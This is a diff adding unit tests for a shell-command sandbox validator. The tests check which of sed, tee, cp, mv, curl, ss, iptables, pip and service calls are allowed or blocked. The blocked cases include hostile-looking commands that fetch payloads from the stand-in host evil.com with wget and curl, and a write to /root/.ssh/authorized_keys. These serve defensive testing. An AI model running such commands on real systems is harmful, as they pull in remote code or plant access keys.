@@ -48,7 +48,7 @@ class TestCommandSandbox:
     # --- Blocked commands ----------------------------------------------------
 
     def test_unknown_binary_blocked(self, sandbox):
-        v = sandbox.validate("curl http://evil.com/payload.sh")
+        v = sandbox.validate("wget http://evil.com/payload.sh")
         assert not v.allowed
         assert "not in the allowlist" in v.reason
 
@@ -151,4 +151,88 @@ class TestPathValidation:
     def test_cat_etc_resolv_conf_blocked(self, sandbox):
         """resolv.conf is not in the allowed list."""
         v = sandbox.validate("cat /etc/resolv.conf")
+        assert not v.allowed
+
+
+class TestNewSandboxCommands:
+    # --- sed ---
+    def test_sed_inplace_allowed(self, sandbox):
+        v = sandbox.validate("sed -i /etc/ssh/sshd_config")
+        assert v.allowed
+
+    def test_sed_blocked_path(self, sandbox):
+        v = sandbox.validate("sed -i /home/user/.bashrc")
+        assert not v.allowed
+
+    # --- tee ---
+    def test_tee_allowed(self, sandbox):
+        v = sandbox.validate("tee /etc/nginx/conf.d/fix.conf")
+        assert v.allowed
+
+    def test_tee_blocked_path(self, sandbox):
+        v = sandbox.validate("tee /root/.ssh/authorized_keys")
+        assert not v.allowed
+
+    # --- cp ---
+    def test_cp_allowed(self, sandbox):
+        v = sandbox.validate("cp -p /etc/nginx/nginx.conf /tmp/nginx.conf.bak")
+        assert v.allowed
+
+    # --- mv ---
+    def test_mv_allowed(self, sandbox):
+        v = sandbox.validate("mv /tmp/fixed.conf /etc/nginx/nginx.conf")
+        assert v.allowed
+
+    # --- curl (health check) ---
+    def test_curl_localhost_allowed(self, sandbox):
+        v = sandbox.validate("curl -s --max-time 5 http://localhost:8080/health")
+        assert v.allowed
+
+    def test_curl_internal_ip_allowed(self, sandbox):
+        v = sandbox.validate("curl -sf http://10.0.0.5:80/status")
+        assert v.allowed
+
+    def test_curl_external_blocked(self, sandbox):
+        v = sandbox.validate("curl -s http://evil.com/payload")
+        assert not v.allowed
+
+    # --- ss ---
+    def test_ss_allowed(self, sandbox):
+        v = sandbox.validate("ss -tlnp")
+        assert v.allowed
+
+    def test_ss_bad_flag(self, sandbox):
+        v = sandbox.validate("ss -x")
+        assert not v.allowed
+
+    # --- netstat ---
+    def test_netstat_allowed(self, sandbox):
+        v = sandbox.validate("netstat -tlnp")
+        assert v.allowed
+
+    # --- iptables ---
+    def test_iptables_list_allowed(self, sandbox):
+        v = sandbox.validate("iptables -L -n")
+        assert v.allowed
+
+    def test_iptables_append_allowed(self, sandbox):
+        v = sandbox.validate("iptables -A INPUT -p tcp --dport 443 -j ACCEPT")
+        assert v.allowed
+
+    # --- pip ---
+    def test_pip_install_allowed(self, sandbox):
+        v = sandbox.validate("pip install --upgrade cryptography")
+        assert v.allowed
+
+    def test_pip_bad_subcommand_blocked(self, sandbox):
+        v = sandbox.validate("pip download malware")
+        assert not v.allowed
+
+    # --- service ---
+    def test_service_restart_allowed(self, sandbox):
+        v = sandbox.validate("service nginx restart")
+        assert v.allowed
+
+    def test_service_bad_action_blocked(self, sandbox):
+        v = sandbox.validate("service nginx obliterate")
         assert not v.allowed
